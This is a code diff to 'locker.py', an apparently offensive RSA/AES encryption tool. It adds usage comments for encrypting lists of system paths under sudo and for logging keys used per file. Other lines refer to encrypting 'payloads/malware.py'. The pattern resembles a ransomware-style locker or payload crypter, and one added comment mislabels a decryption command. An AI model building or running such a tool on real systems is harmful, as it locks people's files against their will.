@@ -44,7 +44,7 @@ def parse_arguments():
     ## sudo ./locker.py -ag AES_keys/aes_key1
 
     # Generate new RSA key
-    ## sudo ./locker.py -rg locking             # This command generate a new RSA key pair
+    ## sudo ./locker.py -rg RSA/lock             # This command generate a new RSA key pair
 
     # RSA algorithms
     ## sudo ./locker.py -re AES_keys/aes_key1       -rpub RSA/lock_pem.pub  # This command encrypt an AES key using RSA
@@ -53,6 +53,11 @@ def parse_arguments():
     # AES algorithms
     ## sudo ./locker.py -rd AES_keys/aes_key1.enc   -rpem RSA/lock.pem -ae -p payloads/malware.py      # This command decrypts an AES key with RSA and then encrypts a file using AES
     ## sudo ./locker.py -rd AES_keys/aes_key1.enc   -rpem RSA/lock.pem -ad -p payloads/malware.py.bin  # This command decrypts and AES key with RSA and then decrypt a file using AES
+
+    ## sudo ./locker.py -rd AES_keys/aes_key1.enc   -rpem RSA/lock.pem -ae -l samples/paths_for_encryption      # This command decrypts an AES key with RSA and then encrypts a list of paths in the system using AES
+    ## sudo ./locker.py -rd AES_keys/aes_key1.enc   -rpem RSA/lock.pem -ad -l samples/paths_for_decryption      # This command decrypts an AES key with RSA and then encrypts a list of paths in the system using AES
+
+    # In the 'key_logs.csv' file will be logged which files were encrypted and which key was used, for further decryption purposes.
 
     return parser.parse_args()
 
@@ -207,7 +212,9 @@ def main():
         private_key = load_private_key(private_key_pem)
         encrypted_code = load_encrypted_code(enc_path)
 
+        # Decrypt using RSA
         symmetric_key = rsa_decrypt(private_key, encrypted_code)
+        print("[!] RSA decryption sucess!")
 
         # When -p is provided apply the workflow for a single file
         if args.path:
